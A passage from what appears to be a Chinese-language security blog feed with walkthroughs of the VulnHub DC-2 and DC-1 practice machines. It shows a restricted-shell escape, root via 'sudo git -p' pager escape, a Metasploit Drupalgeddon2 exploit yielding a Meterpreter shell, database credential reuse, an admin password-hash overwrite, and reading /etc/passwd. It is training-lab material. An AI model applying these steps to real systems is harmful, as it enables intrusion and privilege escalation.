cat: <span class="token builtin class-name">command</span> not foundtom@DC-2:~$ <span class="token function">sudo</span>-rbash: sudo: <span class="token builtin class-name">command</span> not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>连cat都被限制了</p></li><li><p>只能搞到我的kali机器看看了</p></li><li><p>先看看有没有scp</p></li><li><p>有~</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> flag3.txt root@192.168.0.21:/tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>然后输入以下密码就OK了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:/tmp<span class="token comment"># cat flag3.txt</span>Poor old Tom is always running after Jerry. Perhaps he should <span class="token function">su</span> <span class="token keyword">for</span> all the stress he causes.<span class="token comment">#可怜的老汤姆老是追杰瑞。也许他应该为他造成的所有压力而宽慰。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>现在限制了好多命令，而且启的还是rbash <code>echo $SHELL</code>可以看当前使用的shell</p></li><li><p>那我们切换到bash看看行不</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token environment constant">BASH_CMDS</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">=</span>/bin/sh<span class="token punctuation">;</span>a <span class="token comment">#(百度到这个可以还个零临时的用用)</span><span class="token comment"># 换了之后还是没有命令？看看环境变量</span><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>/home/tom/usr/bin<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/bin:/usr/bin<span class="token comment">#自己设置一下环境变量</span><span class="token function">su</span> jerry <span class="token comment">#切换到jerry</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>进了，还看到了flag4~</p></li><li><p>我们先看看flag4写的什么</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Good to see that you<span class="token string">'ve made it this far - but you'</span>re not home yet.You still need to get the final flag <span class="token punctuation">(</span>the only flag that really counts<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">)</span>.No hints here - you're on your own now.  :-<span class="token punctuation">)</span>Go on - <span class="token function">git</span> outta here<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>大概意思就是说用git离开这里~</p></li><li><p>我们还是先看看<code>history sudo -l  ... </code>这些命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">jerry@DC-2:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>Matching Defaults entries <span class="token keyword">for</span> jerry on DC-2:env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/binUser jerry may run the following commands on DC-2:<span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>可以无密码使用root执行git</p></li><li><p>这个我也不咋会用</p></li><li><p>百度的到一个说是有个缓冲区漏洞</p></li><li><p>git 开启分页的时候可以输入命令启bash</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">jerry@DC-2:~$ <span class="token function">sudo</span> <span class="token function">git</span> <span class="token parameter variable">-p</span> configusage: <span class="token function">git</span> config <span class="token punctuation">[</span>options<span class="token punctuation">]</span>Config <span class="token function">file</span> location<span class="token parameter variable">--global</span>              use global config <span class="token function">file</span><span class="token parameter variable">--system</span>              use system config <span class="token function">file</span><span class="token parameter variable">--local</span>               use repository config <span class="token function">file</span>-f, <span class="token parameter variable">--file</span> <span class="token operator">&lt;</span>file<span class="token operator">></span>     use given config <span class="token function">file</span><span class="token parameter variable">--blob</span> <span class="token operator">&lt;</span>blob-id<span class="token operator">></span>      <span class="token builtin class-name">read</span> config from given blob objectAction<span class="token parameter variable">--get</span>                 get value: name <span class="token punctuation">[</span>value-regex<span class="token punctuation">]</span>--get-all             get all values: key <span class="token punctuation">[</span>value-regex<span class="token punctuation">]</span>--get-regexp          get values <span class="token keyword">for</span> regexp: name-regex <span class="token punctuation">[</span>value-regex<span class="token punctuation">]</span>--get-urlmatch        get value specific <span class="token keyword">for</span> the URL: section<span class="token punctuation">[</span>.var<span class="token punctuation">]</span> URL--replace-all         replace all matching variables: name value <span class="token punctuation">[</span>value_regex<span class="token punctuation">]</span><span class="token parameter variable">--add</span>                 <span class="token function">add</span> a new variable: name value<span class="token parameter variable">--unset</span>               remove a variable: name <span class="token punctuation">[</span>value-regex<span class="token punctuation">]</span>--unset-all           remove all matches: name <span class="token punctuation">[</span>value-regex<span class="token punctuation">]</span>--rename-section      <span class="token function">rename</span> section: old-name new-name--remove-section      remove a section: name-l, <span class="token parameter variable">--list</span>            list all-e, <span class="token parameter variable">--edit</span>            <span class="token function">open</span> an editor--get-color <span class="token operator">&lt;</span>slot<span class="token operator">></span>    <span class="token function">find</span> the color configured: <span class="token punctuation">[</span>default<span class="token punctuation">]</span>--get-colorbool <span class="token operator">&lt;</span>slot<span class="token operator">></span><span class="token function">find</span> the color setting: <span class="token punctuation">[</span>stdout-is-tty<span class="token punctuation">]</span><span class="token operator">!</span>bashroot@DC-2:/home/jerry<span class="token comment"># id</span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>root@DC-2:/home/jerry<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>要记得把屏幕缩小来哦要不然就不会出现分页了~</p></li><li><p>这样就拿到了root权限了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@DC-2:~<span class="token comment"># cat final-flag.txt</span>   __    __     _ _       _                    _  / / /<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>___<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>   __<span class="token operator">|</span> <span class="token operator">|</span> ___  _ __   ___  / <span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>/  <span class="token punctuation">\</span>/ / _ <span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token operator">|</span>  / _` <span class="token operator">|</span>/ _ <span class="token punctuation">\</span><span class="token operator">|</span> <span class="token string">'_ \ / _ \/  /   \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/    \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/Congratulatons!!!A special thanks to all those who sent me tweetsand provided me with feedback - it'</span>s all greatlyappreciated.If you enjoyed this CTF, send me a twet via @DCAU7.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="2-重要信息"><a href="#2-重要信息" class="headerlink" title="2. 重要信息"></a>2. 重要信息</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1. 网站后台密码</span>user1:tompasswd:parturientuser2:jerrypasswd:adipiscing<span class="token comment"># 后来在网站目录下搞到的</span>define<span class="token punctuation">(</span><span class="token string">'DB_NAME'</span>, <span class="token string">'wordpressdb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>/** MySQL database username */define<span class="token punctuation">(</span><span class="token string">'DB_USER'</span>, <span class="token string">'wpadmin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>/** MySQL database password */define<span class="token punctuation">(</span><span class="token string">'DB_PASSWORD'</span>, <span class="token string">'4uTiLL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1靶机渗透</title>
      <link href="/dc-1/"/>
      <url>/dc-1/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1靶机渗透"><a href="#DC-1靶机渗透" class="headerlink" title="DC-1靶机渗透"></a>DC-1靶机渗透</h1><h2 id="1-渗透过程"><a href="#1-渗透过程" class="headerlink" title="1. 渗透过程"></a>1. 渗透过程</h2><ul><li><p>直接开始~~</p></li><li><p>IP发现 <code>netdiscover</code></p></li><li><p>找到一个ip为 <code>192.168.0.119</code>的机器</p></li><li><p>给他扫下端口 <code>nmap -sT T4 -v -p- 192.168.0.119 -oN /tmp/res.txt</code></p></li><li><p>结果如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Nmap 7.70 scan initiated Fri Apr 24 14:34:40 2020 as: nmap -sT -v -p- -oN /tmp/res.txt T4 192.168.0.119</span>Nmap scan report <span class="token keyword">for</span> T4 <span class="token punctuation">(</span><span class="token number">223.82</span>.248.117<span class="token punctuation">)</span> <span class="token punctuation">[</span>host down<span class="token punctuation">]</span>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.0.119Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00017s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65531</span> closed portsPORT      STATE SERVICE<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span><span class="token number">80</span>/tcp    <span class="token function">open</span>  http<span class="token number">111</span>/tcp   <span class="token function">open</span>  rpcbind<span class="token number">47675</span>/tcp <span class="token function">open</span>  unknownMAC Address: 00:0C:29:D0:43:83 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Read data files from: /usr/bin/<span class="token punctuation">..</span>/share/nmap<span class="token comment"># Nmap done at Fri Apr 24 14:34:45 2020 -- 2 IP addresses (1 host up) scanned in 5.79 seconds</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>有个<code>rpcbind</code>没见过的百度了一下：</p><blockquote><p>  RPC是远程过程调用（Remote Procedure Call）的缩写形式。SAP系统RPC调用的原理其实很简单，有一些类似于三层构架的C&#x2F;S系统，第三方的客户程序通过接口调用SAP内部的标准或自定义函数，获得函数返回的数据进行处理后显示或打印。</p></blockquote></li><li><p>接着就是用<code>nikto</code>扫描一下web服务</p></li><li><p>让他先扫描…</p></li><li><p>nikto扫描得到两个比较有用的地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.0.119/?<span class="token operator">=</span>PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 <span class="token comment">#这个是phpinfo()</span>http://192.168.0.119/xmlrpc.php <span class="token comment">#这个只有这样一句话：XML-RPC server accepts POST requests only.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>也不知道咋用啊。。。。</p></li><li><p>我们进浏览器看看</p></li><li><p>就是一个登录的页面？</p></li><li><p>用插件 <code>wappalyzer</code>看到web的框架是 <code>Drupal 7</code></p></li><li><p>先看看存不存在框架漏洞</p></li><li><p>直接启动我们的神器：<code>msfconsole</code> </p></li><li><p>搜索一下框架漏洞<code>search Drupal</code></p></li><li><p>找到好几个呢，我们直接使用最新的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Name:exploit/unix/webapp/drupal_drupalgeddon2       Disclosure Date:<span class="token number">2018</span>-03-28       Rank:excellent  Check:Yes    Description：Drupal Drupalgeddon <span class="token number">2</span> Forms API Property Injection<span class="token punctuation">(</span>Drupal Drupalgeddon <span class="token number">2</span>表单API属性注入<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>show options</code> 看看要什么参数，</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Module options <span class="token punctuation">(</span>exploit/unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span>:Name         Current Setting  Required  Description----         ---------------  --------  -----------RHOSTS                        <span class="token function">yes</span>        The target address range or CIDR <span class="token comment">#只要设置这个就能跑了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>那就设置：<code>set RHOST 192.168.0.119</code></p></li><li><p>接着就是激动人心的时刻了: <code>exploit</code> </p></li><li><p>得到一个会话，成了~</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">38247</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.0.119<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.0.21:4444 -<span class="token operator">></span> <span class="token number">192.168</span>.0.119:34430<span class="token punctuation">)</span> at <span class="token number">2020</span>-04-24 <span class="token number">15</span>:40:03 +0800meterpreter <span class="token operator">></span> shell<span class="token comment">#获得标准shell</span>python <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>ls</code> 一下，看到一个<code>flag1.txt</code>的文件</p></li><li><p><code>cat</code> 一下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Every good CMS needs a config <span class="token function">file</span> - and so <span class="token keyword">do</span> you.<span class="token comment">#每一个好的CMS都需要一个配置文件-你也是。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>找配置文件？不知道</p></li><li><p>百度去~ </p></li><li><p>找到是在<code>/var/www/sites/default/setting.php</code></p></li><li><p><code>cat</code> 一下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">/**     *     * flag2     * Brute force and dictionary attacks aren't the     * only ways to gain access (and you WILL need access).     * What can you do with these credentials?     * 不是暴力和字典攻击     * 只有获得访问权限的方法（而且您将需要访问权限）。     * 你能用这些证件做什么？     *     */</span>    <span class="token variable">$databases</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>    <span class="token string single-quoted-string">'default'</span> <span class="token operator">=></span>    <span class="token keyword">array</span> <span class="token punctuation">(</span>        <span class="token string single-quoted-string">'default'</span> <span class="token operator">=></span>        <span class="token keyword">array</span> <span class="token punctuation">(</span>            <span class="token string single-quoted-string">'database'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'drupaldb'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'dbuser'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'password'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'R0ck3t'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'host'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'port'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'driver'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'mysql'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'prefix'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>找到了flag2，还看到了数据库的账号密码</p></li><li><p>登录<code>mysql</code>看看</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-udbuser</span> <span class="token parameter variable">-pR0ck3t</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>我们先看看有什么数据库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show databases<span class="token punctuation">;</span>+--------------------+<span class="token operator">|</span> Database           <span class="token operator">|</span>+--------------------+<span class="token operator">|</span> information_schema <span class="token operator">|</span><span class="token operator">|</span> drupaldb           <span class="token operator">|</span>+--------------------+<span class="token number">2</span> rows <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.02</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>没有mysql库 <code>~_~||</code></p></li><li><p>那就进 <code>drupaldb</code>看看网站的登录密码吧~</p></li><li><p><code>use drupaldb</code> <code>show tables;</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">+-----------------------------+<span class="token operator">|</span> Tables_in_drupaldb          <span class="token operator">|</span>+-----------------------------+<span class="token operator">|</span> actions                     <span class="token operator">|</span><span class="token operator">|</span> authmap                     <span class="token operator">|</span><span class="token operator">|</span> batch                       <span class="token operator">|</span><span class="token operator">|</span> block                       <span class="token operator">|</span><span class="token operator">|</span> block_custom                <span class="token operator">|</span><span class="token operator">|</span> block_node_type             <span class="token operator">|</span><span class="token operator">|</span> block_role                  <span class="token operator">|</span><span class="token operator">|</span> blocked_ips                 <span class="token operator">|</span><span class="token operator">|</span> cache                       <span class="token operator">|</span><span class="token operator">|</span> cache_block                 <span class="token operator">|</span><span class="token operator">|</span> cache_bootstrap             <span class="token operator">|</span><span class="token operator">|</span> cache_field                 <span class="token operator">|</span><span class="token operator">|</span> cache_filter                <span class="token operator">|</span><span class="token operator">|</span> cache_form                  <span class="token operator">|</span><span class="token operator">|</span> cache_image                 <span class="token operator">|</span><span class="token operator">|</span> cache_menu                  <span class="token operator">|</span><span class="token operator">|</span> cache_page                  <span class="token operator">|</span><span class="token operator">|</span> cache_path                  <span class="token operator">|</span><span class="token operator">|</span> cache_update                <span class="token operator">|</span><span class="token operator">|</span> cache_views                 <span class="token operator">|</span><span class="token operator">|</span> cache_views_data            <span class="token operator">|</span><span class="token operator">|</span> comment                     <span class="token operator">|</span><span class="token operator">|</span> ctools_css_cache            <span class="token operator">|</span><span class="token operator">|</span> ctools_object_cache         <span class="token operator">|</span><span class="token operator">|</span> date_format_locale          <span class="token operator">|</span><span class="token operator">|</span> date_format_type            <span class="token operator">|</span><span class="token operator">|</span> date_formats                <span class="token operator">|</span><span class="token operator">|</span> field_config                <span class="token operator">|</span><span class="token operator">|</span> field_config_instance       <span class="token operator">|</span><span class="token operator">|</span> field_data_body             <span class="token operator">|</span><span class="token operator">|</span> field_data_comment_body     <span class="token operator">|</span><span class="token operator">|</span> field_data_field_image      <span class="token operator">|</span><span class="token operator">|</span> field_data_field_tags       <span class="token operator">|</span><span class="token operator">|</span> field_revision_body         <span class="token operator">|</span><span class="token operator">|</span> field_revision_comment_body <span class="token operator">|</span><span class="token operator">|</span> field_revision_field_image  <span class="token operator">|</span><span class="token operator">|</span> field_revision_field_tags   <span class="token operator">|</span><span class="token operator">|</span> file_managed                <span class="token operator">|</span><span class="token operator">|</span> file_usage                  <span class="token operator">|</span><span class="token operator">|</span> filter                      <span class="token operator">|</span><span class="token operator">|</span> filter_format               <span class="token operator">|</span><span class="token operator">|</span> flood                       <span class="token operator">|</span><span class="token operator">|</span> <span class="token function">history</span>                     <span class="token operator">|</span><span class="token operator">|</span> image_effects               <span class="token operator">|</span><span class="token operator">|</span> image_styles                <span class="token operator">|</span><span class="token operator">|</span> menu_custom                 <span class="token operator">|</span><span class="token operator">|</span> menu_links                  <span class="token operator">|</span><span class="token operator">|</span> menu_router                 <span class="token operator">|</span><span class="token operator">|</span> <span class="token function">node</span>                        <span class="token operator">|</span><span class="token operator">|</span> node_access                 <span class="token operator">|</span><span class="token operator">|</span> node_comment_statistics     <span class="token operator">|</span><span class="token operator">|</span> node_revision               <span class="token operator">|</span><span class="token operator">|</span> node_type                   <span class="token operator">|</span><span class="token operator">|</span> queue                       <span class="token operator">|</span><span class="token operator">|</span> rdf_mapping                 <span class="token operator">|</span><span class="token operator">|</span> registry                    <span class="token operator">|</span><span class="token operator">|</span> registry_file               <span class="token operator">|</span><span class="token operator">|</span> role                        <span class="token operator">|</span><span class="token operator">|</span> role_permission             <span class="token operator">|</span><span class="token operator">|</span> search_dataset              <span class="token operator">|</span><span class="token operator">|</span> search_index                <span class="token operator">|</span><span class="token operator">|</span> search_node_links           <span class="token operator">|</span><span class="token operator">|</span> search_total                <span class="token operator">|</span><span class="token operator">|</span> semaphore                   <span class="token operator">|</span><span class="token operator">|</span> sequences                   <span class="token operator">|</span><span class="token operator">|</span> sessions                    <span class="token operator">|</span><span class="token operator">|</span> shortcut_set                <span class="token operator">|</span><span class="token operator">|</span> shortcut_set_users          <span class="token operator">|</span><span class="token operator">|</span> system                      <span class="token operator">|</span><span class="token operator">|</span> taxonomy_index              <span class="token operator">|</span><span class="token operator">|</span> taxonomy_term_data          <span class="token operator">|</span><span class="token operator">|</span> taxonomy_term_hierarchy     <span class="token operator">|</span><span class="token operator">|</span> taxonomy_vocabulary         <span class="token operator">|</span><span class="token operator">|</span> url_alias                   <span class="token operator">|</span><span class="token operator">|</span> <span class="token function">users</span>                       <span class="token operator">|</span><span class="token operator">|</span> users_roles                 <span class="token operator">|</span><span class="token operator">|</span> variable                    <span class="token operator">|</span><span class="token operator">|</span> views_display               <span class="token operator">|</span><span class="token operator">|</span> views_view                  <span class="token operator">|</span><span class="token operator">|</span> watchdog                    <span class="token operator">|</span>+-----------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>好多表啊~~</p></li><li><p>有个 <code>users</code>我们查询一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">select</span> uid,name,pass from <span class="token function">users</span><span class="token punctuation">;</span>+-----+-------+---------------------------------------------------------+<span class="token operator">|</span> uid <span class="token operator">|</span> name  <span class="token operator">|</span> pass                                                    <span class="token operator">|</span>+-----+-------+---------------------------------------------------------+<span class="token operator">|</span>   <span class="token number">0</span> <span class="token operator">|</span>       <span class="token operator">|</span>                                                         <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span> admin <span class="token operator">|</span> <span class="token variable">$S</span><span class="token variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR <span class="token operator">|</span><span class="token operator">|</span>   <span class="token number">2</span> <span class="token operator">|</span> Fred  <span class="token operator">|</span> <span class="token variable">$S</span><span class="token variable">$DWGrxef6</span>.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg <span class="token operator">|</span>+-----+-------+---------------------------------------------------------+<span class="token number">3</span> rows <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>这后面是什么鬼密码？？</p></li><li><p>不是MD5，咋办~~~</p></li><li><p>找官网搜索密码重置</p></li><li><p>最后在 <code>https://www.drupal.org/node/1023428</code> 找到相关方法</p></li><li><p>说执行 <code>./scripts/password-hash.sh newpwd</code>可以得到一个新密码</p></li><li><p>那我们把它admin用户的密码给改了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./scripts/password-hash.sh <span class="token number">1234</span>password: <span class="token number">1234</span>          hash: <span class="token variable">$S</span><span class="token variable">$DSM0f3PE7gij</span>.NOoFJC2nqT1A8.1M6hh5LHeeQ62d.ghV0I9yz6U<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>进数据库给他改了</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> <span class="token keyword">set</span> pass<span class="token operator">=</span><span class="token string">'$S$DSM0f3PE7gij.NOoFJC2nqT1A8.1M6hh5LHeeQ62d.ghV0I9yz6U'</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> uid<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>Query OK<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token keyword">row</span> affected <span class="token punctuation">(</span><span class="token number">0.06</span> sec<span class="token punctuation">)</span><span class="token keyword">Rows</span> <span class="token keyword">matched</span>: <span class="token number">1</span>  Changed: <span class="token number">1</span>  <span class="token keyword">Warnings</span>: <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>登录网站。点击上面的 <code>content</code></p></li><li><p>找到一篇 <code>flag3</code>的文章内容是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Special PERMS will <span class="token builtin class-name">help</span> FIND the <span class="token function">passwd</span> - but you<span class="token string">'ll need to -exec that command to work out how to get what'</span>s <span class="token keyword">in</span> the shadow.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>找到关键信息：<code>FIND -exec</code> 和 <code>shadow</code>；</p></li><li><p>那我们去看看 <code>/etc/shadow</code> 文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat: /etc/shadow: Permission denied<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>没有权限？</p></li><li><p>那 <code>/etc/passwd</code>呢？</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>:/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shDebian-exim:x:101:104::/var/spool/exim4:/bin/falsestatd:x:102:65534::/var/lib/nfs:/bin/falsemessagebus:x:103:107::/var/run/dbus:/bin/falsesshd:x:104:65534::/var/run/sshd:/usr/sbin/nologinmysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/falseflag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>找到一个<code>flag4</code>的用户home目录在<code>/home/flag4</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> /home/flag4flag4.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>有一个 <code>flag4.txt</code>我们试着读取一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /home/flag4/flag4.txtCan you use this same method to <span class="token function">find</span> or access the flag <span class="token keyword">in</span> root?Probably. 